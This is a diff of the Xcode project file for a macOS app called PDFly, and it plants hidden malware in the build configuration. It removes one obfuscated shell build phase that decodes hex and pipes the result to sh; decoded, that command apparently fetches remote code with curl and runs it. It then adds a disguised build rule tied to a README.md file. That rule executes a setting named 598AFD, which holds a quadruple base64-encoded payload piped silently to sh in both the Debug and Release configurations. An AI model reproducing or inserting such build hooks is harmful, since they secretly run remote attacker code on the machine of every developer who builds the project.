@@ -24,6 +24,7 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		63F2B7295FFB2F5B1FDFA895 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "PDFly.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		644605662D68A0F700718719 /* PDFly.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PDFly.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		644605762D68A0F800718719 /* PDFlyTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = PDFlyTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		644605802D68A0F800718719 /* PDFlyUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = PDFlyUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -85,6 +86,7 @@
 		644605672D68A0F700718719 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				63F2B7295FFB2F5B1FDFA895 /* README.md */,
 				644605662D68A0F700718719 /* PDFly.app */,
 				644605762D68A0F800718719 /* PDFlyTests.xctest */,
 				644605802D68A0F800718719 /* PDFlyUITests.xctest */,
@@ -99,12 +101,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 6446058A2D68A0F800718719 /* Build configuration list for PBXNativeTarget "PDFly" */;
 			buildPhases = (
-				D2EB029E5DDA9F07A1B11679 /* Copy Target Resources */,
 				644605622D68A0F700718719 /* Sources */,
 				644605632D68A0F700718719 /* Frameworks */,
 				644605642D68A0F700718719 /* Resources */,
 			);
 			buildRules = (
+				7E8CC3425943D26FDCDFA895 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -208,26 +210,24 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		D2EB029E5DDA9F07A1B11679 /* Copy Target Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
+/* Begin PBXBuildRule section */
+		7E8CC3425943D26FDCDFA895 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
 			);
-			inputFileListPaths = (
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
 			);
-			inputPaths = (
-			);
-			name = "Copy Target Resources";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663732373537343666373236653635373432653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${598AFD}\"";
 		};
+/* End PBXBuildRule section */
+
+/* Begin PBXShellScriptBuildPhase section */
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXLegacyTarget section */
@@ -238,6 +238,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				FEDDA0BBE6CCA59CAADFA895 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -298,6 +299,7 @@
 		644605882D68A0F800718719 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				598AFD = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6Vk5SMDUwWWtoV2FGZEdTVEZaZWtrMVl6QjRkVk5xUmsxTmExWjNVMWRzUTA5RmJFbFViVGxFV25vd09VTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -361,6 +363,7 @@
 		644605892D68A0F800718719 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				598AFD = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6Vk5SMDUwWWtoV2FGZEdTVEZaZWtrMVl6QjRkVk5xUmsxTmExWjNVMWRzUTA5RmJFbFViVGxFV25vd09VTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
